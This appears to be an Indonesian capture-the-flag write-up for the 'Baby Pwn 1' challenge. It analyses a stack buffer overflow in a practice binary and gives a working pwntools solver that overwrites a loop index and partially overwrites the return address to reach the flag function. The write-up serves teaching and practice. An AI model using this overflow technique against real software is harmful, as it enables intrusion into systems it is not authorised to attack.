# PWN
## Baby Pwn 1
`writer: dimas`
### Alat
- gdb + gef
- pwntools
- checksec
- ida64

### Recon
Pada soal kita diberikan source code dan juga binary. Pertama-tama kita coba untuk memeriksa security dari binary tersebut menggunakan checksec:
![](Pasted%20image%2020221231091251.png)

Bisa dilihat pada gambar diatas bahwa `Stack canary` di disable. Jadi kita bisa membuffer overflow program tanpa perlu kawatir dengan stack canary.

Setelah itu kita akan mencoba untuk mendisassamble binary teserbut menggunakan ida64. Di ida64 kita menemukan beberapa fungsi penting yaitu:

- Yang pertama ada fungsi flag yang berfungsi untuk membaca flag.

```cpp
__int64 flag(void)
{
  __int64 v0; // rax
  char v2[536]; // [rsp+0h] [rbp-220h] BYREF

  std::basic_ifstream<char,std::char_traits<char>>::basic_ifstream(v2, "flag.txt", 8LL);
  if ( (unsigned __int8)std::basic_ifstream<char,std::char_traits<char>>::is_open(v2) )
  {
    v0 = std::basic_ifstream<char,std::char_traits<char>>::rdbuf(v2);
    std::ostream::operator<<(&std::cout, v0);
  }
  std::basic_ifstream<char,std::char_traits<char>>::close(v2);
  putchar(10);
  return std::basic_ifstream<char,std::char_traits<char>>::~basic_ifstream(v2);
}
```

- Yang kedua ada fungsi vuln dimana vulnerability buffer overflow berada.
```cpp
int vuln(void)
{
  int result; // eax
  char v1[104]; // [rsp+0h] [rbp-70h]
  int v2; // [rsp+68h] [rbp-8h]
  int v3; // [rsp+6Ch] [rbp-4h]

  Setup();
  v3 = 0;
  logo();
  puts("Hello! welcome to TCP1P!");
  puts("What is your name?");
  do
  {
    result = getchar();
    v2 = result;
    if ( result == 10 )
      break;
    result = v3;
    v1[v3++] = v2;
  }
  while ( v3 != 121 );
  return result;
}
```

Jadi buffer overflow berada di dalam loop `do while` dimana `do while`  menerima input lebih banyak dari variable `char v1[104]` sehingga mengakibatkan buffer overflow.

Buffer overflow ini bisa mempengaruhi variable v2 dan v3 yang berada di bawahnya. Karna variable `v3` ini berfungsi untuk mengatur index pada variable `v1` kita dapat merubah variable `v3` sehingga nanti kita bisa membypass restriksi ini `while ( v3 != 121 );` dimana jika kita merubah variable `v3` menjadi lebih besar dari `121` maka kondisi tidak akan pernah terpenuhi dalam loop, sehingga kita bisa mendapatkan infinity loop dan dari situ kita bisa membuat buffer overflow ke return address untuk mengontrol return address tersebut.

### Eksploitasi
Pertama yang harus kita lakukan adalah menentukkan padding agar kita dapat meng-buffer overflow variable `v3`. Kita akan cek  lagi pseudocde pada vungsi `vuln` di bagian deklarasi variable.

```cpp
  int result; // eax
  char v1[104]; // [rsp+0h] [rbp-70h]
  int v2; // [rsp+68h] [rbp-8h]
  int v3; // [rsp+6Ch] [rbp-4h]
```

Jadi untuk menemukan padding yang pas kita perlu menghitung dari variable `char v1[104]`. Variable ini memiliki buffer sebanyak 104 byte dan setelah itu ada variable `v2` sebanyak 4 byte (kita bisa tau karna [type int](https://www.geeksforgeeks.org/data-types-in-c/) menggunakan 4 byte). Jadi dari situ kita bisa mendapatkan padding sebanyak 108 byte untuk mencapai variable `v3`:

```
v1[104] + v2[4] = 108
```

Karna pada security di binary ada `pie enable` address dari setiap fungsi akan di randomize, Kita hanya bisa merubah address terakhir dari return address untuk ke ke fungsi yang valid.

![](Pasted%20image%2020221231091251.png)

Karna yang paling dekat dengan fungsi vuln adalah fungsi main, dimana fungsi main ini ada call flag didalamnya, maka kita dapat merubah byte terakhir di return adress dengan byte dari fungsi main yang ada call flag tersebut.
```cpp
int main()  
{  
   bool showflag = false;
   vuln();  
   if (showflag){  
       flag();  <- kita ingin locat ke address ini
   }  
}
```

berikut solver yang saya gunakan untuk solve challenge tersebut.
```python
from pwn import *
import sys

BINARY = "chall"
context.binary = exe = ELF(BINARY, checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

x, p = init()

x.debug((
    "break *vuln+87\nc\n" # while ( v3 != 121 )
    "c\n"*56 # continue sampai v3 ter overwrite
    # "break *vuln+98\nc\n" # break point return
))

padding = b"A"*108
payload = padding
payload += p8(142) # index byte terakhir dari return address
payload += p8((exe.sym['main']+23) & 0xff) # byte terakhir dari fungsi main+23 = call flag

p.sendline(payload)

p.interactive()
```